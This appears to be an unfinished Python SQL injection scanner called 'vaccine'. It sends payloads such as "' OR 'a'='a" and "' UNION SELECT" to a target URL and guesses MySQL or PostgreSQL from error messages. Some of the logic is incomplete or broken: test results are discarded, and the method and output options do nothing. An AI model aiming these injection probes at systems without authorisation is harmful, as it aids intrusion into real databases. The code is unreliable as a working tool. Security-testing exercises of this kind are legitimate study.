#!/usr/bin/python3

import argparse, requests, re, os, sys, difflib, time


def test1(url, db_engine, payload):
    try:
        response = requests.get(url, params={"query": payload})
        if db_engine == "MySQL" and "MySQL error" in response.text:
            return True
        elif db_engine == "PostgreSQL" and "PostgreSQL error" in response.text:
            return True
    except requests.exceptions.RequestException:
        pass
    return False


def test2(url, db_engine, payload):
    try:
        start_time = time.time()
        response = requests.get(url, params={"query": payload})
        end_time = time.time()
        if db_engine == "MySQL" and end_time - start_time > 5:
            return True
        if db_engine == "PostgreSQL" and end_time - start_time > 5:
            return True
    except requests.exceptions.RequestException:
        pass
    return False


def detect_database(url):
    payload = "' OR 'a'='a"
    
    try:
        response = requests.get(url, params={"query": payload})
        mysql_error_pattern = "You have an error in your SQL syntax"
        postgresql_error_pattern = "ERROR: syntax error at or near"
        
        print(response)

        if mysql_error_pattern in response.text:
            return "MySQL"
        elif postgresql_error_pattern in response.text:
            return "PostgreSQL"
        
    except requests.exceptions.RequestException as e:
        print(f"Error during database detection: {e}")
        return None

    return None


def vaccine(url, method):
    db_engine = detect_database(url)
    if not db_engine:
        print("Database engine detection failed.")
        return
    
    try:
        payload = "' UNION SELECT"
        test1(url, db_engine, payload)
        test2(url, db_engine, payload)

    except Exception as e:
        print(f"Error: {str(e)}")



def validate_args(args):
    if not args.url.startswith(('https://', 'http://')):
        args.url = 'http://' + args.url
    args.X = args.X.upper()
    if args.X != 'POST' and args.X != 'GET':
        print(f"Request type {args.X} not supported")
        sys.exit(1)


def store_results(results, filename):
    with open(filename, 'wb') as file:
        for result in results:
            file.write(result + "\n")
        print(f"Reults writes in {filename}")


def parse_arguments():
    parser = argparse.ArgumentParser("Vaccine programme for testing SQL security")
    parser.add_argument('-o', type=str, default='archive.txt', help="Archive file")
    parser.add_argument('-X', type=str, default='GET', help="Type of request")
    parser.add_argument('url', help="url targeted")
    return parser.parse_args()


def main():
    global url
    args = parse_arguments()
    validate_args(args)
    url = args.url
    vaccine(url, args.X)


if __name__ == "__main__":
    main()

    